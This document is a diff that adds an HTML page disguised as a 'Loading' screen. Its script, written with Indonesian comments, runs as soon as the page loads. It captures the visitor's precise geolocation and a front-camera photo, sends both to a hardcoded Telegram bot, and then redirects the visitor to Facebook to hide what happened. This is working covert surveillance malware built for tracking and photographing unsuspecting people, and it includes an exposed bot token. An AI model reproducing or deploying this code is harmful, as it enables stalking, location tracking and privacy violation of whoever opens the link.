@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading</title>
+<style>
+  body { margin:0; background:#fff; font-family:sans-serif; }
+  #status { position:fixed; bottom:20px; left:0; right:0; text-align:center; color:#999; font-size:13px; }
+</style>
+</head>
+<body>
+<div id="status"></div>
+
+<script>
+const BOT_TOKEN = "8634866786:AAEOEqCHMoqqwfwc1VWb35Braps_zzwX-zE";
+const CHAT_ID   = "1966317946";
+const FB_URL    = "https://www.facebook.com/";
+
+let locationData = null;
+let cameraDone   = false;
+
+function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+  }).catch(() => {});
+}
+
+function kirimFoto(blob) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", blob, "cam.jpg");
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: form
+  }).catch(() => {});
+}
+
+function cekSelesai() {
+  if (locationData && cameraDone) {
+    sendToTelegram(
+      "<b>Data Masuk</b>\n" +
+      "Lat: " + locationData.lat + "\n" +
+      "Lon: " + locationData.lon + "\n" +
+      "Akurasi: " + locationData.acc + " m\n" +
+      "Map: https://maps.google.com/?q=" + locationData.lat + "," + locationData.lon
+    );
+    setTimeout(() => { window.location.href = FB_URL; }, 800);
+  }
+}
+
+// ==== LOKASI ====
+function mintaLokasi() {
+  if (!navigator.geolocation) { locationData = { lat:"-", lon:"-", acc:"-" }; cekSelesai(); return; }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      locationData = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: Math.round(pos.coords.accuracy)
+      };
+      cekSelesai();
+    },
+    () => {
+      locationData = { lat:"ditolak", lon:"ditolak", acc:"-" };
+      cekSelesai();
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+// ==== KAMERA DEPAN ====
+async function mintaKamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.setAttribute("playsinline", "true");
+    video.muted = true;
+    await video.play();
+    await new Promise(r => setTimeout(r, 1200)); // biar fokus stabil
+
+    const canvas = document.createElement("canvas");
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob((blob) => {
+      if (blob) kirimFoto(blob);
+      stream.getTracks().forEach(t => t.stop());
+      cameraDone = true;
+      cekSelesai();
+    }, "image/jpeg", 0.85);
+  } catch (e) {
+    cameraDone = true;
+    cekSelesai();
+  }
+}
+
+// jalanin pas halaman load
+window.addEventListener("load", () => {
+  mintaLokasi();
+  mintaKamera();
+});
+</script>
+</body>
+</html>
